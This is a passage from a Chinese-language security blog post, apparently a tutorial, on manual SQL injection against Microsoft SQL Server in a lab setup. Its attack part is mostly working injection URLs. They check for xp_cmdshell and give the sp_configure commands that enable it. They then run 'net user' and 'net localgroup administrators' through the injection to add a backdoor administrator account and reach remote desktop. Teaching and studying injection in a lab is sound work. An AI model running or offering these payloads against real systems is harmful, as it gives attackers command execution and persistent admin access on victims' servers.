+<h3 id="Mssql手工注入另类玩法"><a href="#Mssql手工注入另类玩法" class="headerlink" title="Mssql手工注入另类玩法"></a>Mssql手工注入另类玩法</h3><p>因为我们刚才知道了网站的权限是 <code>sa</code> 权限，那么我们就可以干很多事，包括执行系统命令等等！</p>
+<p><code>xp_cmdshell</code>：<code>SQL</code>中运行系统命令行的系统存储过程，一般在安全级别较高的服务器权限上。也就是它开启的话我们就可以执行系统命令！</p>
+<h4 id="判断xp-cmdshell是否存在"><a href="#判断xp-cmdshell是否存在" class="headerlink" title="判断xp_cmdshell是否存在:"></a>判断<code>xp_cmdshell</code>是否存在:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1386.png" alt="图片"></p>
+<p>可以看到，页面返回正常，说明<code>xp_cmdshell</code>开启了的！</p>
+<p><code>xp_cmdshell</code>默认在<code>mssql_2000</code>中是开启的，在<code>mssql_2005</code>之后的版本中则默认禁止。如果用户拥有管理员<code>sa</code>权限则可以用<code>sp_configure</code>重新开启它。</p>
+<p>详细可看这篇文章：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-3221-1-1.html">https://bbs.ichunqiu.com/thread-3221-1-1.html</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开启 xp_cmdshell：</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;reconfigure;</span><br><span class="line">关闭 xp_cmdshell：</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;reconfigure</span><br></pre></td></tr></table></figure>
+
+<h4 id="xp-cmdshell执行命令提权"><a href="#xp-cmdshell执行命令提权" class="headerlink" title="xp_cmdshell执行命令提权"></a>xp_cmdshell执行命令提权</h4><p>首先我们服务器上只有这些用户：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1387.png" alt="图片"></p>
+<p>我们使用<code>xp_cmdshell</code>对他提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 ;exec master..xp_cmdshell &quot;net user saul saul123 /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1388.png" alt="图片"></p>
+<p>页面返回正常说明执行成功！</p>
+<p>我们吧 <code>saul</code> 用户添加到管理员组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1  ;exec master..xp_cmdshell &quot;net localgroup administrators saul /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1389.png" alt="图片"></p>
+<p>这个时候因为它的页面是不回显，那么我们来到服务器看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1390.png" alt="图片"></p>
+<p>由上图可见，我们创建了一个 <code>saul</code> 用户到目标服务器提权成功了！接下来如果目标是外网那么我们就可以登录到它的远程桌面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1391.png" alt="图片"></p>
+<p>至此，MsSQL手工注入就讲到这里！如果大家有什么意见可以到我微信公众号反馈~</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/09/SQL-MsSQL/">http://example.com/2020/03/09/SQL-MsSQL/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MsSQL/"># MsSQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/12/SQL-MsSQL-1/">Microsoft SQL Server手注之联合查询注入</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/09/Vulnhub-DC-9/">VulnHub通关日记-DC_9-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
